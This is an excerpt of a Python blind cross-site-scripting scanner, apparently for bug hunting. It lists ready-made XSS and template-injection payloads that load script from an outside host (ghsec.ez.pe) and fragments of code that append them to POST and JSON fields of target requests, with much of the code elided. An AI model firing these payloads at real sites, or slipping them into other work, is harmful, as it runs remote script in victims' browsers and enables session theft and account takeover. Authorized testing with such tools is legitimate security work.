...
# Configuration
XSS_PAYLOADS = [
    '\'"--><script src=//ghsec.ez.pe></script>',
    '\'"-->"><script src=//ghsec.ez.pe></script>',
    '\'"-->"><script src=//ghsec.ez.pe></script><x="',
    '$.getScript("//ghsec.ez.pe")',
    '"--><img src onerror=import(\'//ghsec.ez.pe\')>',
    '"--><img/src/onerror=import(\'//ghsec.ez.pe\')>',
    '"--><svg><script href=//ghsec.ez.pe />',
    '"--><svg/onload=import(\'//ghsec.ez.pe\')>',
    "javascript:import('//ghsec.ez.pe')",
    '{{_openBlock.constructor(\'import("//ghsec.ez.pe")\')()}}',
    '{{constructor.constructor(\'import("//ghsec.ez.pe")\')()}}',
    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'//ghsec.ez.pe\\';document.body.appendChild(a)')",
    "document.head.appendChild(Object.assign(document.createElement('script'),{src:'//ghsec.ez.pe'}));"
]
XSS_CONTENT_TYPES = [
    "text/html", "application/xhtml+xml", "application/xml", "text/xml",
    "image/svg+xml", "text/xsl", "application/vnd.wap.xhtml+xml", "text/rdf",
    "application/rdf+xml", "application/mathml+xml", "text/vtt", "text/cache-manifest"
]
DEFAULT_TIMEOUT = 10
SEMAPHORE_LIMIT = 5

last_results = []  # for SIGINT save


def clean_headers(headers):
    """Remove Content-Length and Transfer-Encoding headers."""
    if not headers:
        return {}
        ...
        # 2. POST body injection
            ...
            for payload in XSS_PAYLOADS:
                ...
                if isinstance(body, str):
                    ...
                    json_to_send = {k: (v + payload if isinstance(v, str) else v) for k, v in body.items()}
                else:
...
async def test_xss(session, url, method, headers=None, data=None, json_data=None):
    """Send HTTP request with cleaned headers and check for reflected XSS."""
    try:
...
if __name__ == "__main__":
    ...
    parser.add_argument("--output", default="result_bxss.json", help="Output file for results")
